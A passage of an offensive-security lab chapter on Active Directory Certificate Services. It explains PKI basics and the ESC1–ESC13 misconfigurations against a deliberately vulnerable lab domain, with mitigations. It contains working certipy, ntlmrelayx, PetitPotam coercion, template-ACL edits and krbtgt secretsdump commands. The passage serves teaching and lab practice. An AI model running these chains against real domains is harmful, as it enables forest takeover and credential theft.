# 06 — PKI and ADCS: From RSA to ESC16

ADCS (Active Directory Certificate Services) is the AD-integrated certificate
authority. It is, by a wide margin, the single richest attack surface in
modern AD. The "ESC" papers — *Certified Pre-Owned* by Will Schroeder and Lee
Christensen, originally describing ESC1–ESC8 and since expanded to ESC1–
ESC16 by the wider community — catalogue sixteen distinct misconfigurations,
each of which lets attackers obtain certificates that authenticate as
arbitrary principals, up to and including Domain Administrators and
Enterprise Administrators.

We start from RSA and X.509 first principles because too many operators run
`certipy req` without understanding what they are producing. By the end of
this chapter you should be able to:

- Hand-parse a PEM cert and identify its EKU OIDs and SAN entries.
- Read a template's `nTSecurityDescriptor` and decide whether a low-priv
  user can enroll, and what damage that enables.
- Explain in one sentence each what makes ESC1 through ESC16 distinct.
- Walk through the Certifried (CVE-2022-26923) chain by hand.
- Explain the difference between "enrollee supplies subject" (template
  bit) and `EDITF_ATTRIBUTESUBJECTALTNAME2` (CA-level flag).
- Plant and remove a Shadow Credential without leaving artefacts.

DVAD's CA (`ca01.corp.local`) is deliberately misconfigured to expose every
one of the ESCs. The chapter ends with a fix table you'll apply when you
practise hardening in chapter 13.

---

## 6.0 (Context) Why ADCS exists in AD at all

PKI in Microsoft's world predates AD. The 1999 release of Windows 2000
shipped both AD and "Certificate Services" together. From the beginning,
ADCS was used for:

- **Smart card logon** — replacing passwords with PIN+card.
- **Wireless and VPN** — 802.1X EAP-TLS device and user auth.
- **S/MIME email signing and encryption** — Outlook/Exchange.
- **TLS server certs** for internal IIS/SharePoint/etc.
- **Code signing** for internally-built software.
- **EFS** (Encrypting File System) — file-level encryption.
- **IPSec** machine-cert authentication.

The "AD-integrated" part is what makes ADCS interesting (and dangerous):
templates, security descriptors, group-based enrollment, OID-to-group
links, and machine auto-enrollment all live in the AD directory itself,
specifically in `CN=Public Key Services,CN=Services,CN=Configuration,
DC=corp,DC=local`. The CA reads and writes to AD; AD trusts the CA's
issued certs for PKINIT via `NTAuthCertificates`. The result is a deeply
intertwined system where misconfigurations in one corner (a template ACL,
a CA registry flag, a DC hardening mode) compose into full forest
takeover.

ADCS came of age in an era when "private network" was a meaningful
security boundary. It was designed to be permissive, with templates that
could be enrolled with one click. Most of the ESC papers turn on
configuration values that were Microsoft's defaults, or near-defaults,
until shockingly recently.

---

## 6.1 (Concept) Public-key crypto in one screen

Two keys, mathematically linked:

- **Private key** — secret to its owner.
- **Public key** — distributable.

What you do with them depends on direction:

- **Encrypt with public, decrypt with private** → confidentiality. Anyone
  can send a message; only the owner reads.
- **Sign with private, verify with public** → authenticity. Owner signs;
  anyone verifies the owner did the signing.

Asymmetric crypto is slow. In practice, you use it to negotiate a symmetric
session key (TLS handshake) or to sign small things (certificates, ticket
PA blobs, Kerberos PA-PK-AS-REQ).

### RSA primer (you can skip the math if confident)

Two big primes p, q. n = p*q. φ(n) = (p-1)(q-1). Pick e coprime to φ(n)
(commonly 65537). Compute d ≡ e⁻¹ mod φ(n).

Public key: (n, e). Private key: (n, d).

Encrypt: c = m^e mod n. Decrypt: m = c^d mod n. Sign: σ = m^d mod n.
Verify: m =? σ^e mod n.

Modern AD CAs default to RSA-2048 or RSA-4096. ECC (Elliptic Curve) is
supported (P-256, P-384) but uncommon in legacy deployments because some
legacy Windows clients can't validate ECDSA chains.

Practical operator implications:

- A stolen private key is game-over for the binding it certifies. If you
  exfiltrate a `dc01$` machine cert + private key, you have `dc01$` until
  the cert expires or is revoked.
- Cracking RSA-2048 is not feasible. Don't try.
- Cracking the **password protecting a PFX** is feasible if the password
  is weak: `john --format=pfx evil.pfx` does it (or hashcat 27800).

### What "PKCS#" means

The PKCS standards are a numbered family of crypto serialization specs:

- **PKCS#1** — RSA algorithm and signature padding.
- **PKCS#7 / CMS** — Cryptographic Message Syntax. A wrapper for signed
  or encrypted blobs. The `.p7b` cert-chain format.
- **PKCS#10** — Certificate Signing Request. What you send to the CA.
- **PKCS#11** — Hardware token / smart card API.
- **PKCS#12** — PFX archive: cert + private key + chain + password.

You will see all of these in tooling output. `certipy` writes PFX by
default. `openssl pkcs12 -in foo.pfx -info` shows you what's inside.

---

## 6.2 (Concept) X.509 certificates

A certificate is a structured blob that binds a public key to an
identity, signed by a CA.

```
Certificate
  TBSCertificate (to-be-signed)
    Version (v3)
    SerialNumber (unique within CA)
    Signature algorithm
    Issuer (CN of the CA)
    Validity (notBefore / notAfter)
    Subject (the identity being certified)
    SubjectPublicKeyInfo (the public key)
    Extensions:
      KeyUsage (digitalSignature, keyEncipherment, ...)
      ExtendedKeyUsage / EKU (the *purpose*: Server Auth, Client Auth,
                              Smart Card Logon, ...)
      SubjectAltName (additional names: DNS, IP, UPN, ...)
      AuthorityKeyIdentifier / SubjectKeyIdentifier
      CRL Distribution Points
      Authority Information Access
      szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) — the SID-binding
                                  extension added by KB5014754
  SignatureAlgorithm
  Signature       <- the CA's signature over TBSCertificate
```

### EKU — the magic field

Authentication certs require specific EKUs:

| EKU OID | Meaning |
|---|---|
| `1.3.6.1.5.5.7.3.1` | TLS Server Authentication |
| `1.3.6.1.5.5.7.3.2` | TLS Client Authentication |
| `1.3.6.1.5.5.7.3.4` | Secure Email (S/MIME) |
| `1.3.6.1.5.5.7.3.7` | IPSec User |
| `1.3.6.1.4.1.311.20.2.1` | Certificate Request Agent (RA) |
| `1.3.6.1.4.1.311.20.2.2` | Smart Card Logon |
| `1.3.6.1.4.1.311.10.3.4` | Encrypting File System (EFS) |
| `1.3.6.1.4.1.311.10.3.12` | Document Signing |
| `2.5.29.37.0` | Any Purpose |
| (no EKU extension at all) | No constraint — works for everything |

A cert with **Client Authentication** EKU and a UPN in SAN can do PKINIT
— that's the keystone of all auth-related ESCs. **Smart Card Logon** is
also accepted by the KDC for PKINIT (it implies Client Auth).

### SAN — the field you'll spoof

`SubjectAltName` (SAN) is a sequence of named alternatives:

```
SubjectAltName ::= GeneralNames
GeneralName ::= CHOICE {
   otherName             [0] OtherName,             -- including UPN
   rfc822Name            [1] IA5String,             -- email
   dNSName               [2] IA5String,             -- DNS host
   x400Address           [3] ORAddress,
   directoryName         [4] Name,
   ediPartyName          [5] EDIPartyName,
   uniformResourceIdent  [6] IA5String,
   iPAddress             [7] OCTET STRING,
   registeredID          [8] OBJECT IDENTIFIER
}
```

For AD client auth, the relevant SAN entries are:

- **OtherName with OID `1.3.6.1.4.1.311.20.2.3`** (Microsoft UPN). Used
  for **user** PKINIT.
- **dNSName** (DNS host). Used for **computer** PKINIT (`dc01.corp.local`
  in the cert maps to `DC01$` in AD when strong binding is off).

If a SAN says `dnsName=dc01.corp.local`, the KDC will authenticate the
holder as `DC01$` (subject to mapping policy). If the SAN says
`UPN=Administrator@corp.local`, the KDC will authenticate as
`Administrator`. Spoofing the SAN is what ESC1 and ESC6 do.

---

## 6.3 (Concept) Certificate chains and trust

A cert is trusted if it chains to a root CA your client trusts. Chains
look like:

```
Root CA  -->  Intermediate CA  -->  End-entity certificate
(self-signed)  (signed by Root)     (signed by Intermediate)
```

In Windows, the root store lives in the cert store under
`LocalMachine\Root`. In AD, the **`NTAuthCertificates`** store
(`CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,
DC=corp,DC=local`) lists CAs whose end-entity certs are trusted for
**AD authentication**. Removing a CA from this list breaks PKINIT for
certs it issues. (`NTAuth` therefore is a higher trust bar than ordinary
TLS chaining.)

**Operator note:** when you compromise a CA, you don't get just one cert,
you get the ability to *issue* any cert. `certutil -ca.cert` and
`certutil -ca.exch` can extract CA keys if the CA private key is exportable
(which it shouldn't be — DPAPI-protected by default). If the CA was
upgraded from an old install or the operator manually unprotected it, you
can extract and forge offline forever. That's the **Golden Certificate**
analog of Golden Ticket.

### Containers in the Configuration NC

```
CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
├── CN=AIA                           Authority Info Access certs
├── CN=CDP                           CRL Distribution Points
├── CN=Certificate Templates         All templates (cert template objects)
├── CN=Certification Authorities     Root CA certs (forest-wide trusted roots)
├── CN=Enrollment Services           Enterprise CAs (where to send CSRs)
├── CN=KRA                           Key Recovery Agents
├── CN=NTAuthCertificates            CAs trusted for client auth via PKINIT
└── CN=OID                           OIDs and OID-to-group mappings (ESC13)
```

`certipy find` walks all of these. So can `Get-ADObject -SearchBase ...
-LDAPFilter ...` in PowerShell, or any LDAP browser.

---

## 6.4 (Concept) Enrollment — getting a cert

Standard flow:

1. Client generates RSA keypair.
2. Client builds a **CSR (Certificate Signing Request)** — PKCS#10 —
   containing public key + desired subject/extensions, signed by private
   key (proves possession).
3. CSR sent to CA via one of:
   - **DCOM/RPC** (`ICertRequest` — port 135 + dynamic high ports).
   - **Web Enrollment** (`/certsrv/` IIS endpoint).
   - **CES / CEP** (Certificate Enrollment Web Services — modern HTTPS).
   - **Network Device Enrollment (NDES/SCEP)**.
4. CA validates the request against the **template** (security
   descriptor, name flags, EKUs, requirements).
5. CA signs and returns the certificate. Private key stays with client
   (unless CA archives keys, which is rare).

DVAD's CA (`ca01.corp.local`) runs Microsoft Enterprise CA with multiple
weak templates. The role is "AD CS — Certificate Authority" plus "Web
Enrollment" (giving ESC8).

### Enrollment endpoints and the protocols on the wire

| Endpoint | Protocol | Port | Auth | DVAD enabled |
|---|---|---|---|---|
| ICertRequest DCOM | MS-WCCE | 135 + RPC | Kerberos/NTLM | yes (default) |
| `/certsrv/` web | HTTP | 80 | NTLM | yes (ESC8) |
| CES Web Service | HTTPS SOAP | 443 | Negotiate/Cert | sometimes |
| CEP Policy Web Service | HTTPS SOAP | 443 | Negotiate | sometimes |
| NDES/SCEP | HTTP/HTTPS | 80/443 | challenge string | no in DVAD |

The protocol that matters most for offence is **MS-WCCE** because every
certipy command speaks it under the hood. Look at MS-WCCE if you ever
need to write your own enrollment client.

---

## 6.5 (Mechanics) Certificate templates

Templates live in AD at `CN=Certificate Templates,CN=Public Key Services,
CN=Services,CN=Configuration,...`. Each template has properties:

| Property | What it controls |
|---|---|
| `pKIDefaultKeySpec` | Key spec (1 = AT_KEYEXCHANGE, 2 = AT_SIGNATURE) |
| `pKIKeyUsage` | Bits — digitalSignature, keyEncipherment, etc. |
| `pKIExtendedKeyUsage` | EKU OIDs (multivalued) |
| `msPKI-Certificate-Name-Flag` | Subject name source (FROM_AD vs SUPPLIED_IN_REQUEST) |
| `msPKI-Enrollment-Flag` | Various flags (CA manager approval, autoenrollment, NO_SECURITY_EXTENSION...) |
| `msPKI-Private-Key-Flag` | Key creation flags (exportable, etc.) |
| `msPKI-RA-Application-Policies` | Application policies (additional EKUs) |
| `msPKI-RA-Signature` | How many RA signatures required (≥ 1 means "manager approval") |
| `msPKI-Template-Schema-Version` | 1, 2, 3, 4 — schema generation |
| **nTSecurityDescriptor** | **The DACL — who can read/enroll/write** |

### msPKI-Certificate-Name-Flag bit reference

```
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT                  = 0x00000001
CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME     = 0x00000008
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME         = 0x00010000
CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS             = 0x00400000
CT_FLAG_SUBJECT_ALT_REQUIRE_SPN                    = 0x00800000
CT_FLAG_SUBJECT_ALT_REQUIRE_DIRECTORY_GUID         = 0x01000000
CT_FLAG_SUBJECT_ALT_REQUIRE_UPN                    = 0x02000000
CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL                  = 0x04000000
CT_FLAG_SUBJECT_ALT_REQUIRE_DNS                    = 0x08000000
CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN                  = 0x10000000
CT_FLAG_SUBJECT_REQUIRE_EMAIL                      = 0x20000000
CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME                = 0x40000000
CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH             = 0x80000000
```

### msPKI-Enrollment-Flag bit reference

```
CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS               = 0x00000001
CT_FLAG_PEND_ALL_REQUESTS                          = 0x00000002  -- manager approval
CT_FLAG_PUBLISH_TO_KRA_CONTAINER                   = 0x00000004
CT_FLAG_PUBLISH_TO_DS                              = 0x00000008
CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE  = 0x00000010
CT_FLAG_AUTO_ENROLLMENT                            = 0x00000020
CT_FLAG_DOMAIN_AUTHENTICATION_NOT_REQUIRED         = 0x00000080
CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT    = 0x00000040
CT_FLAG_USER_INTERACTION_REQUIRED                  = 0x00000100
CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE = 0x00000400
CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF                  = 0x00000800
CT_FLAG_ADD_OCSP_NOCHECK                           = 0x00001000
CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL = 0x00002000
CT_FLAG_NO_REVOCATION_INFO_IN_ISSUED_CERTS         = 0x00004000
CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS     = 0x00008000
CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT = 0x00010000
CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST             = 0x00020000
CT_FLAG_SKIP_AUTO_RENEWAL                          = 0x00040000
CT_FLAG_NO_SECURITY_EXTENSION                      = 0x00080000  -- ESC9!
```

### The bit that defines ESC1

`msPKI-Certificate-Name-Flag` has bit `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
(`0x1`). If set, the requester can put **any subject name and SAN** in
the CSR — including a UPN like `Administrator@corp.local`. Combined with
a Client Authentication EKU, that's instant impersonation: request a
cert as `Administrator`, authenticate via PKINIT, profit.

### Template DACL — who can enroll

The `nTSecurityDescriptor` controls access. Relevant ACEs:

- `Enroll` (extended right OID `0e10c968-78fb-11d2-90d4-00c04f79dc55`) —
  permission to enroll in this template.
- `AutoEnroll` (`a05b8cc2-17bc-4802-a710-e7c15ab866a2`) — auto-enroll.
- `WriteProperty`, `WriteDacl`, `GenericAll`, `WriteOwner` — ACL-control
  (ESC4 territory).

`certipy find` parses the DACL and prints who has what:

```
Enrollment Rights
  CORP.LOCAL\Domain Users        <-- low-priv enroll = bad
  CORP.LOCAL\Authenticated Users <-- worse
Object Control Permissions
  Owner: CORP.LOCAL\Administrator
  WriteOwner: CORP.LOCAL\Administrators
  WriteDacl:  CORP.LOCAL\Administrators
```

---

## 6.6 (Concept) The ESC catalogue — one-line summaries

| ESC | One-line | Where the misconfiguration lives |
|---|---|---|
| **ESC1** | Template allows enrollee-supplied subject + Client Auth EKU + low-priv principal can enroll | Template DACL + Name-Flag |
| **ESC2** | Template has "Any Purpose" EKU or no EKU + low-priv enroll | Template EKU |
| **ESC3** | "Enrollment Agent" template lets you request certs on behalf of others | Template + EKU 1.3.6.1.4.1.311.20.2.1 |
| **ESC4** | Vulnerable ACL on the template object itself (you can edit it) | Template SD |
| **ESC5** | Vulnerable ACL on the CA object, certificate object, or hosting AD components | CA / PKS container ACL |
| **ESC6** | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag — SAN supplied in CSR honored regardless of template | CA config flag |
| **ESC7** | CA-level role abuse: "Manage CA" or "Manage Certificates" lets you approve pending requests / change config | CA role |
| **ESC8** | HTTP web enrollment endpoint — NTLM relay target | Web Enrollment with NTLM no channel-binding |
| **ESC9** | `CT_FLAG_NO_SECURITY_EXTENSION` — cert has no szOID_NTDS_CA_SECURITY_EXT → mapped by UPN/DNS → spoofable | Enrollment-Flag bit |
| **ESC10** | Weak StrongCertificateBindingEnforcement / CertificateMappingMethods — UPN spoofing works post-KB5014754 fallback | DC registry |
| **ESC11** | RPC enrollment without channel binding (IF_ENFORCEENCRYPTICERTREQUEST off) | CA config |
| **ESC12** | (less canonical) YubiHSM / TPM compromise of CA private key | CA host |
| **ESC13** | OID Group Link — template grants group membership via cert issuance | msDS-OIDToGroupLink |
| **ESC14** | altSecurityIdentities mapping — explicit cert→user map, weak | User attribute |
| **ESC15** | EKUwu — schema v1 templates accept application-policy EKU upgrade | v1 templates |
| **ESC16** | Disabled szOID_NTDS_CA_SECURITY_EXT validation on a CA (CA-side ESC9) | CA registry |

DVAD provisions vulnerable templates for nearly all of these (see
`ansible/roles/adcs_vulns`).

The remaining sections walk each ESC. Where the chain is identical to a
previously-shown one we just point at the differences.

---

## 6.7 (Mechanics) ESC1 step by step

Precondition: a template `ESC1Template` (or similar) with:

- ENROLLEE_SUPPLIES_SUBJECT bit set.
- EKU = Client Authentication.
- Low-priv group (e.g., `Domain Users`) can enroll (DACL grants `Enroll`).

Attacker has any low-priv credential (e.g., `svc_vision:Summer2023!`).

```bash
# Step 1: discover templates
certipy find -u svc_vision@corp.local -p 'Summer2023!' \
        -dc-ip 10.10.0.10 -text -stdout > certipy.out
grep -B2 -A20 ESC1 certipy.out
```

Note the template name and the CA name (`CORP-CA`).

```bash
# Step 2: request a certificate as Administrator
certipy req \
        -u svc_vision@corp.local -p 'Summer2023!' \
        -dc-ip 10.10.0.10 -target ca01.corp.local \
        -ca CORP-CA -template ESC1Template \
        -upn Administrator@corp.local
# certipy now has administrator.pfx
```

```bash
# Step 3: PKINIT as Administrator
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
# returns: Administrator's TGT + their NT hash (via U2U + PAC_CREDENTIAL_INFO)
```

Now you can `psexec` the DC.

### Why this works

The KDC, on receipt of PA-PK-AS-REQ, decodes the cert and inspects:

1. Issuer chain — must chain to a CA listed in `NTAuthCertificates`.
   `CORP-CA` is in there.
2. Validity — cert not yet expired.
3. CRL/OCSP — cert not revoked (best-effort; default Windows CA has empty
   CRL, attacker just-issued cert is fresh).
4. SAN mapping — cert SAN says `UPN=Administrator@corp.local`, so the KDC
   looks up that UPN in AD and finds `Administrator`. Issues TGT for
   `Administrator`.

The KDC has no way to know whether `svc_vision` requested this cert or
`Administrator` did. The template's `ENROLLEE_SUPPLIES_SUBJECT` flag told
the CA "trust whatever the requester puts in," so the CA put
`UPN=Administrator` in the cert. Trust collapsed.

### Subtle preconditions

- The target user (`Administrator`) must actually exist in AD. You can't
  PKINIT as `NonExistent@corp.local`.
- The target must be enabled and not have `SMARTCARD_REQUIRED` set in
  a way that conflicts.
- If `StrongCertificateBindingEnforcement = 2` (full enforcement) on the
  DC and the cert lacks the `szOID_NTDS_CA_SECURITY_EXT` extension *for
  the right user's SID*, PKINIT fails. ESC1 with full enforcement requires
  the CA to issue with the correct SID extension, which a CA does **per
  request** — so the CA must populate the extension based on either the
  AD identity it thinks is requesting (`svc_vision`) or the supplied subject
  (`Administrator`). Microsoft's enforcement logic, as of 2024 cumulative,
  embeds the SID of the *requesting principal* (svc_vision), not the
  supplied SAN. So full enforcement defeats vanilla ESC1.
- DVAD is set to `StrongCertificateBindingEnforcement = 1` (compat mode)
  to keep ESC1 live.

---

## 6.8 (Mechanics) ESC2 and ESC3

### ESC2

Template has the "Any Purpose" EKU (OID `2.5.29.37.0`) or no EKU at all.
Either way, the cert can be used for **client auth** (Any Purpose
implies all EKUs; no EKU means no restriction). Same enroll + PKINIT
chain as ESC1, but you may not need ENROLLEE_SUPPLIES_SUBJECT — sometimes
the template's `FROM_AD` subject already maps to a privileged user
(e.g., if the requesting service account is a Domain Admin).

The variant where the template has no EKU at all is sometimes called
**ESC2-NoEKU**. The cert technically can be used for *anything* including
client auth.

### ESC3

Template has the Certificate Request Agent EKU (`1.3.6.1.4.1.311.20.2.1`).
You enroll a cert with this EKU. Then you build an "enrollment-on-
behalf-of" request, signing as the enrollment agent, requesting a Client
Auth cert for any target user. Two-step process; tooling supports it
natively.

```bash
# Step 1: enroll an Enrollment Agent cert
certipy req \
        -u svc_vision@corp.local -p 'Summer2023!' \
        -ca CORP-CA -template EnrollmentAgent

# Step 2: use the EA cert to enroll for someone else
certipy req \
        -u svc_vision@corp.local -p 'Summer2023!' \
        -ca CORP-CA -template User \
        -on-behalf-of 'corp\Administrator' \
        -pfx svc_vision.pfx
```

### Why this exists at all

Enrollment Agents are a real feature: smart-card administrators enroll
certs on behalf of end users who can't or won't enroll themselves. The
template is supposed to be ACL-restricted to a small "enrollment agent"
group. ESC3 is when that ACL is sloppy — `Domain Users` can enroll the
EA template.

The mitigation is **enrollment agent restrictions**: on the CA, you can
configure which users an EA can request on-behalf-of which templates.
DVAD leaves these unset.

---

## 6.9 (Mechanics) ESC4

You have GenericWrite (or GenericAll, WriteDacl, WriteOwner) on a
*certificate template*. You edit the template's `msPKI-Certificate-
Name-Flag` bits to add `ENROLLEE_SUPPLIES_SUBJECT`, and grant yourself
enrollment rights. You've just made an ESC1.

```bash
certipy template \
        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
        -template VulnerableTemplate -save-old      # backup
certipy template \
        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
        -template VulnerableTemplate                # apply the ESC1 transform
# now enroll as in ESC1
```

`-save-old` writes a JSON backup so you can restore the template to its
prior config after the exploit. **Always restore in lab work.** A
permanently-modified template will fail validation in your peers'
sessions.

### Manual ACL edits

If you prefer to do it by hand (great for understanding):

```bash
dacledit.py -action 'write' \
            -rights 'WriteProperty' \
            -principal peter.parker \
            -target-dn 'CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
            -inheritance \
            corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
```

Then use any LDAP tool to flip the Name-Flag bit:

```bash
bloodyAD --host dc01 -u peter.parker -p 'DVADlab2024!' \
         set object 'CN=VulnerableTemplate,...' \
         msPKI-Certificate-Name-Flag 0x1
```

---

## 6.10 (Mechanics) ESC5

ESC5 is the "ACL on adjacent objects" family: WriteOwner / WriteDacl /
GenericAll on:

- The CA object itself (`CN=CORP-CA,CN=Enrollment Services,CN=Public Key
  Services,...`). Letting you change `EditFlags` (→ ESC6) or template
  binding.
- The NTAuthCertificates container — bigger blast radius; you can add a
  new CA cert that you control, and any cert it issues becomes trusted
  for PKINIT. Catastrophic.
- The Root CAs container — add a trusted root.
- The Certificate Templates container — read/write any template.
- The hosting host (e.g., `ca01.corp.local` machine object) — pwn the
  CA host directly.

`certipy find -enabled -vulnerable` prints ESC5 findings under "Object
Control Permissions" lines.

---

## 6.11 (Mechanics) ESC6

CA-level flag. `EDITF_ATTRIBUTESUBJECTALTNAME2` (`0x40000`) on
`HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA name>\
EditFlags` makes the CA honor a SAN in the CSR **regardless of template
settings**. You don't need ENROLLEE_SUPPLIES_SUBJECT on the template —
any template you can enroll in (e.g., default `User`) suddenly grants
impersonation.

```
certutil -getreg policy\EditFlags         # check on the CA host
```

If `EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x40000` is set in `EditFlags`,
ESC6.

```bash
certipy req \
        -u svc_vision@corp.local -p 'Summer2023!' \
        -ca CORP-CA -template User \
        -upn Administrator@corp.local
```

DVAD enables this on `CORP-CA`.

### Why this flag exists

Originally it was a compatibility knob for legacy Windows 2000 clients
that put their SAN in the request only. Microsoft has documented for two
decades that it should not be enabled. It is rarely (but not never) seen
in modern installs, usually as a leftover from an upgrade.

### Detection

`certipy find` flags ESC6 in its CA findings section. The fix is one
command:

```
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

---

## 6.12 (Mechanics) ESC7 — CA roles

The CA has two RBAC-style roles managed via the CA security descriptor:

- **CA Administrators** (`Manage CA`) — can change CA configuration,
  including the EditFlags above. So Manage CA → ESC6 in one step.
- **Certificate Managers** (`Manage Certificates`) — can issue pending
  requests, revoke certs, recover archived keys.

If the CA's DACL grants either right to low-priv principals, that
principal can flip flags or approve pending requests.

```bash
certipy ca \
        -u peter.parker@corp.local -p '...' \
        -ca CORP-CA -add-officer peter.parker
# Grants peter.parker Certificate Manager on the CA
```

A subtler variant: an attacker with **Manage Certificates** can approve
their own pending requests for high-priv templates that have
`PEND_ALL_REQUESTS` (manager-approval flag). If those templates exist,
an attacker submits the request, then approves it.

---

## 6.13 (Mechanics) ESC8 — the relay classic

When the CA installs the **Web Enrollment** role, it adds `/certsrv/` to
IIS, with NTLM authentication enabled. **No channel binding by default.**
Now:

1. Coerce a target (e.g., a DC) to authenticate to your attacker box via
   PetitPotam/PrinterBug/DFSCoerce.
2. Attacker relays the inbound NTLM auth to
   `http://ca01/certsrv/certfnsh.asp` and requests a cert (default
   `DomainController` template) impersonating the DC.
3. Now you have a cert as `dc01$` — DCSync immediately.

```bash
# Terminal A: relay listener
ntlmrelayx.py \
        -t http://ca01.corp.local/certsrv/certfnsh.asp \
        --adcs --template DomainController -smb2support

# Terminal B: coerce
python3 PetitPotam.py \
        -d corp.local -u peter.parker -p 'DVADlab2024!' \
        attacker.10.10.0.1 10.10.0.10
# attacker IP is where ntlmrelayx is listening
```

Output: a base64-encoded PFX for `dc01$`. PKINIT with it, retrieve TGT,
DCSync krbtgt, full control:

```bash
echo 'MIIK...' | base64 -d > dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
# Output: dc01$ NT hash + TGT
impacket-secretsdump -hashes :<dc01$-NT> -just-dc-user krbtgt \
        corp.local/'DC01$'@10.10.0.10
```

DVAD: this is the **CRED-031** primary path.

### Mitigation hierarchy

1. **Disable HTTP enrollment endpoint** entirely. `Remove-WindowsFeature
   ADCS-Web-Enrollment`. Most sites use CES/CEP (HTTPS+Negotiate) which
   doesn't have this exposure.
2. **If you must keep web enrollment, require HTTPS** + Extended
   Protection for Authentication (EPA).
3. **Disable NTLM** for the certsrv vdir.
4. **Patch coercion vectors** (KB5005413 for EFSR, etc.).
5. **`MachineAccountQuota = 0`** prevents the attacker from creating a
   computer to receive the relayed auth as a "different" identity in
   downstream flows.

---

## 6.14 (Mechanics) ESC9 and ESC10

### Background — KB5014754 changes

Microsoft KB5014754 (May 2022) added a security extension to certificates
(`szOID_NTDS_CA_SECURITY_EXT = 1.3.6.1.4.1.311.25.2`) containing the SID
of the AD principal the cert is issued to, so DCs could bind cert→user
precisely. They added a registry
`StrongCertificateBindingEnforcement` with three modes:

- **0**: Disabled (vulnerable — weak mapping unconditional).
- **1**: Compatible — strong mapping first, fall back to weak mapping
  if extension absent.
- **2**: Full enforcement (required by February 2025).

And `CertificateMappingMethods` registry — bitfield indicating which
fallback mapping methods are allowed:

- `0x1` — Subject + Issuer (weak)
- `0x2` — Issuer + Serial Number (weak)
- `0x4` — UPN mapping (weak)
- `0x8` — S4U2Self (weak)
- `0x10` — S4U2Self Explicit (strong)
- `0x20` — Issuer + Serial Number Implicit (strong)

DVAD sets `CertificateMappingMethods = 0x1F` (all weak modes on) and
`StrongCertificateBindingEnforcement = 1`, to allow both ESC9 and ESC10.

### ESC9 — template flag

`CT_FLAG_NO_SECURITY_EXTENSION` (`0x80000`) set on the template →
certs issued don't carry the SID extension → DC has to fall back to
UPN/DNS matching → attacker enrolls with someone else's UPN.

Combined with permission to modify a user's UPN (`peter.parker` has GenericWrite
on `tony.stark`):

```bash
# Step 1: change tony.stark's UPN to administrator
certipy account \
        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
        update -user tony.stark -upn 'administrator@corp.local'

# Step 2: from tony.stark, enroll the no-extension template
certipy req \
        -u tony.stark@corp.local -p 'BobPass!' \
        -ca CORP-CA -template ESC9NoExt

# Step 3: change tony.stark's UPN back so PKINIT doesn't see two admins
certipy account \
        -u peter.parker@corp.local -p 'DVADlab2024!' \
        update -user tony.stark -upn 'tony.stark@corp.local'

# Step 4: PKINIT — DC falls back to UPN map, no extension to disagree
certipy auth -pfx tony.stark.pfx -dc-ip 10.10.0.10 -username administrator -domain corp.local
```

### ESC10 — DC registry

Same idea but driven by the **DC's** weak fallback config, with templates
that *would* normally include the extension. Two sub-variants:

- **ESC10/1** — `CertificateMappingMethods` includes weak UPN mapping
  (`0x4`).
- **ESC10/2** — `StrongCertificateBindingEnforcement = 0` (off entirely).

Exploit is the same as ESC9 in flow.

---

## 6.15 (Mechanics) ESC11

RPC-based enrollment (DCOM, port 135/dynamic) over a CA that lacks
`IF_ENFORCEENCRYPTICERTREQUEST` → unauthenticated RPC enrollment is
relayable to and the channel isn't bound to the auth.

Tooling: `certipy relay` or `Certify.exe relay`.

```bash
# Listener
certipy relay -target rpc://ca01.corp.local
# Coercer (e.g., PetitPotam) -> attacker IP
```

The flag is in the CA's `InterfaceFlags`:

```
certutil -getreg ca\InterfaceFlags
# IF_ENFORCEENCRYPTICERTREQUEST = 0x00000200
```

If unset, ESC11.

---

## 6.16 (Mechanics) ESC12 — physical / HSM compromise

ESC12 is the corner case where the CA's private key is stored in a
hardware module (HSM/TPM/YubiHSM) and the attacker compromises the host
hosting that key, gaining the ability to issue arbitrary certs. Not
really an AD misconfig — more an opsec failure. We mention it for
completeness; DVAD does not include it (the CA is a software CA, so it's
already worse than ESC12 from a key-exfil standpoint).

---

## 6.17 (Mechanics) ESC13

Templates can grant **group memberships** to issuance via the
`msDS-OIDToGroupLink` attribute on a policy OID object. A template's
issuance policy OID is linked to a group; issuing the cert auto-grants
the group SID in the cert's group memberships (and thereby the PAC after
PKINIT).

If the linked group is sensitive (e.g., `Server Operators`) and you can
enroll the template → enroll, PKINIT, your PAC has the group SID, you're
effectively a member.

```bash
certipy find -u peter.parker -p ... | grep -A5 "OID Group"
